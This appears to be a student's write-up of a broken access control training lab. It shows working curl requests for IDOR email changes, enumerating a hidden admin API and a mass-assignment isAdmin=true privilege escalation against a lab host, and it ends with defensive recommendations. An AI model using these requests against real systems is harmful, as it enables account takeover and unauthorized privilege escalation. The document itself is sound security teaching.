🧠 HackSmarter – Chapter 9: Broken Access Control Lab
🎯 Objective

Explore and exploit multiple Broken Access Control vulnerabilities, including:

Insecure Direct Object Reference (IDOR)

Security Through Obscurity (Hidden API endpoint)

Mass Assignment vulnerability

Client-side control bypass (disabled fields)

Environment:

Windows 11 Canary Build (26200.x)

WSL2 Kali Linux

OpenVPN (tun0 lab network)

Firefox ESR

curl

Burp Suite (attempted)

🖥 Lab Environment Setup
Launch Kali
wsl -d kali-linux
Connect VPN
sudo openvpn /mnt/c/Users/tmlyz/Downloads/foundations_of_web_a.ovpn

Confirm tunnel:

ip -br a

Expected:

tun0   UNKNOWN   10.x.x.x/16
🔍 Challenge 1 – IDOR (Email Update)
Discovery

Hidden input:

<input type="hidden" name="user_id" value="1">

Admin user_id discovered via profile inspection:

<input type="hidden" name="user_id" value="3">
Exploit Logic

Modify user_id in request:

action=update_email&user_id=3&email=hacked@test.com
curl Exploit (Authenticated)
curl -i -X POST http://10.1.149.5/profile \
  -H "Cookie: session=SESSION_VALUE" \
  -d "action=update_email&user_id=3&email=hacked@test.com"
Impact

Horizontal privilege escalation

Unauthorized modification of another user’s data

Broken object-level authorization

🔍 Challenge 2 – Hidden Admin API (Security Through Obscurity)

Admin dashboard source revealed:

fetch('/api/users/all')
Vulnerable Endpoint
/api/users/all
Test as normal user
curl http://10.1.149.5/api/users/all

If JSON user directory is returned → Broken Access Control confirmed.

Impact

Sensitive user enumeration

No server-side role enforcement

API exposed to authenticated non-admin users

🔍 Challenge 3 – Mass Assignment

Admin profile source contained:

<input type="hidden" name="isAdmin" value="true">

Backend accepted unfiltered parameters.

Exploit Payload
action=update_info&username=tony&phone=555-0199&isAdmin=true
curl Example
curl -i -X POST http://10.1.149.5/profile \
  -H "Cookie: session=TONY_SESSION" \
  -d "action=update_info&phone=555-0199&isAdmin=true"
Result

Normal user promoted to administrator.

Impact

Vertical privilege escalation

Model mass assignment vulnerability

Missing backend field whitelisting

🔍 Challenge 4 – Client-Side Control Bypass (Disabled Username Field)

Frontend:

<input name="username" value="tony" disabled="disabled">

Disabled field is client-side only.

Bypass Methods

Remove disabled via Inspect

Manually send:

action=update_info&username=newname
Result

Username successfully changed despite UI lock.

Lesson

Client-side controls ≠ security control.

🛠 Commands Used
Network Verification
ping 10.1.x.x
curl -I http://10.1.x.x
nmap -n -Pn -p- TARGET
API Testing
curl http://TARGET/api/users/all
Authenticated POST
curl -X POST URL \
  -H "Cookie: session=VALUE" \
  -d "param=value"
⚠ Burp Suite Issues (WSL + Canary Build)

Observed:

GUI freezing

libEGL / MESA rendering warnings

Proxy tab unresponsive

Example errors:

libEGL warning: failed to get driver name
MESA: error: ZINK: failed to choose pdev
Root Cause

WSLg rendering instability

Java GUI performance issues in Canary build

Resource constraints

Workaround Used

Switched to curl-based testing

Used browser view-source for recon

Extracted session cookies manually

Key Lesson

Tools are optional.
Understanding HTTP is mandatory.

🧠 What We Learned
1. Hidden Fields Are Not Secure

If the server trusts user_id → IDOR.

2. Obscurity Is Not Authorization

If /api/users/all works for users → broken access control.

3. Mass Assignment Is Dangerous

If backend accepts isAdmin=true → privilege escalation.

4. Disabled Inputs Are Cosmetic

Client-side controls can always be bypassed.

5. HTTP > Tools

Even when Burp failed, exploitation continued using curl.

🔥 Core Authorization Failures Observed
Vulnerability	Root Cause
IDOR	Missing ownership validation
Hidden API	Missing role validation
Mass Assignment	No field whitelisting
Username Change	Trusting client-side controls
📌 Defensive Recommendations

Enforce server-side RBAC checks

Validate object ownership before modification

Whitelist accepted model fields

Never trust hidden or disabled fields

Protect sensitive API routes with middleware

🧾 Conclusion

This lab demonstrated real-world authorization failures:

Horizontal privilege escalation

Vertical privilege escalation

Sensitive data exposure

Client-side trust flaws

Even when tooling failed (Burp + WSL rendering issues), exploitation was successfully completed using fundamental HTTP understanding.

This reinforces:

Tools assist.
Understanding wins.
